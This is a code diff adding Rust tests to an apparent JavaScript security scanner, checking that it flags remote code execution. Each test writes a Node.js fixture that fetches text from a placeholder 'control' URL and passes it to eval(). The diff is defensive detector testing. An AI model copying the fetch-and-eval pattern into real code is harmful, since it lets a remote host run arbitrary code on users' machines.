@@ -1299,6 +1299,72 @@ fn node_https_data_callback_reaches_dynamic_execution() {
 }
 
 #[test]
+fn node_http_data_chunks_reach_execution_in_the_end_callback() {
+    let root = temporary_directory("http-chunked-response");
+    fs::write(
+        root.join("main.js"),
+        b"const https = require('https'); https.get('https://example.invalid/control', response => { let payload = ''; response.on('data', chunk => { payload += chunk; }); response.on('end', () => eval(payload)); });",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn node_http_buffered_chunks_reach_execution_in_the_end_callback() {
+    let root = temporary_directory("http-buffered-response");
+    fs::write(
+        root.join("main.js"),
+        b"const https = require('https'); https.get('https://example.invalid/control', response => { const chunks = []; response.on('data', chunk => chunks.push(chunk)); response.on('end', () => eval(Buffer.concat(chunks).toString())); });",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn node_http_data_callback_does_not_taint_immediate_code() {
+    let root = temporary_directory("http-stream-callback-order");
+    fs::write(
+        root.join("main.js"),
+        b"const https = require('https'); https.get('https://example.invalid/control', response => { let payload = ''; response.on('data', chunk => { payload += chunk; }); eval(payload); });",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| finding["id"] != "JS-REMOTE-CODE-EXECUTION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn promise_function_callbacks_and_static_template_sink_are_traced() {
     let root = temporary_directory("function-callback");
     fs::write(
